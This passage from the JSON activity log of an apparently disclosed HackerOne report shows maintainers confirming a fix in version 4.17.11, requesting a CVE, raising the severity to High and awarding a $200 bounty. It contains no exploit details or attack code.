was too quick closing this one. Still need the release that fixes this issue.","markdown_message":"\u003cp\u003eI was too quick closing this one. Still need the release that fixes this issue.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-10-15T08:50:04.359Z","updated_at":"2018-10-15T08:50:04.359Z","actor":{"username":"e_lexy","cleared":false,"url":"/e_lexy","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3481961,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"You can verify on 4.17.11.","markdown_message":"\u003cp\u003eYou can verify on 4.17.11.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-10-15T14:38:54.175Z","updated_at":"2018-10-15T14:38:54.175Z","actor":{"username":"jdalton","cleared":false,"url":"/jdalton","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/237/124/03f44e2935a9cb266645e0eef4065316affe0241_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3481977,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@asgerf could you verify, please?","markdown_message":"\u003cp\u003e\u003ca href=\"/asgerf\"\u003e@asgerf\u003c/a\u003e could you verify, please?\u003c/p\u003e\n","automated_response":false,"created_at":"2018-10-15T14:40:28.585Z","updated_at":"2018-10-15T14:40:28.585Z","actor":{"username":"e_lexy","cleared":false,"url":"/e_lexy","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3482145,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Confirmed fix in 4.17.11","markdown_message":"\u003cp\u003eConfirmed fix in 4.17.11\u003c/p\u003e\n","automated_response":false,"created_at":"2018-10-15T15:04:02.556Z","updated_at":"2018-10-15T15:04:02.556Z","actor":{"username":"asgerf","cleared":false,"url":"/asgerf","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/q5oTdS6oJaM29wThEKhh22Pr/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3482182,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"closing and requesting a CVE","markdown_message":"\u003cp\u003eclosing and requesting a CVE\u003c/p\u003e\n","automated_response":false,"created_at":"2018-10-15T15:12:14.940Z","updated_at":"2018-10-15T15:12:14.940Z","actor":{"username":"e_lexy","cleared":false,"url":"/e_lexy","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"reporter":{"username":"asgerf","url":"/asgerf"},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3482186,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2018-10-15T15:12:26.701Z","updated_at":"2018-10-15T15:12:26.701Z","first_to_agree":true,"actor":{"username":"e_lexy","cleared":false,"url":"/e_lexy","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3482712,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks all for your patience and follow through. Please feel free to ping me for any other issues.","markdown_message":"\u003cp\u003eThanks all for your patience and follow through. Please feel free to ping me for any other issues.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-10-15T16:52:39.827Z","updated_at":"2018-10-15T16:52:39.827Z","actor":{"username":"jdalton","cleared":false,"url":"/jdalton","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/237/124/03f44e2935a9cb266645e0eef4065316affe0241_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3555014,"is_internal":false,"editable":false,"type":"Activities::ManuallyDisclosed","message":"@asgerf disclosing this one now.","markdown_message":"\u003cp\u003e\u003ca href=\"/asgerf\"\u003e@asgerf\u003c/a\u003e disclosing this one now.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-10-30T12:59:31.311Z","updated_at":"2018-10-30T12:59:31.311Z","actor":{"username":"e_lexy","cleared":false,"url":"/e_lexy","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3796929,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@e_lexy Could I ask you request a CVE for this, assigned to the Semmle Security Research Team?","markdown_message":"\u003cp\u003e\u003ca href=\"/e_lexy\"\u003e@e_lexy\u003c/a\u003e Could I ask you request a CVE for this, assigned to the Semmle Security Research Team?\u003c/p\u003e\n","automated_response":false,"created_at":"2018-12-10T09:49:01.796Z","updated_at":"2018-12-10T09:49:01.796Z","actor":{"username":"asgerf","cleared":false,"url":"/asgerf","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/q5oTdS6oJaM29wThEKhh22Pr/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3921194,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @asgerf CVE requested and asked to assign to Semmle Security Research Team. Sorry for the late response","markdown_message":"\u003cp\u003eHi \u003ca href=\"/asgerf\"\u003e@asgerf\u003c/a\u003e CVE requested and asked to assign to Semmle Security Research Team. Sorry for the late response\u003c/p\u003e\n","automated_response":false,"created_at":"2019-01-03T18:22:12.361Z","updated_at":"2019-01-03T18:22:12.361Z","actor":{"username":"e_lexy","cleared":false,"url":"/e_lexy","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4100936,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2019-02-06T07:25:48.318Z","updated_at":"2019-02-06T07:25:48.318Z","additional_data":{"old_severity":"Low","new_severity":"High (7.0)","old_severity_id":182251,"new_severity_id":292827},"actor":{"username":"e_lexy","cleared":false,"url":"/e_lexy","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6468716,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"thank you @asgerf for your work on this report!","markdown_message":"\u003cp\u003ethank you \u003ca href=\"/asgerf\"\u003e@asgerf\u003c/a\u003e for your work on this report!\u003c/p\u003e\n","automated_response":false,"created_at":"2019-12-04T20:01:07.341Z","updated_at":"2019-12-04T20:01:07.341Z","actor":{"url":"/nodejs-ecosystem","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Node.js third-party modules"}},"bounty_amount":"200.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"nodejs-ecosystem","collaborator":{"username":"asgerf","url":"/asgerf"},"actor_is_team_member":true,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}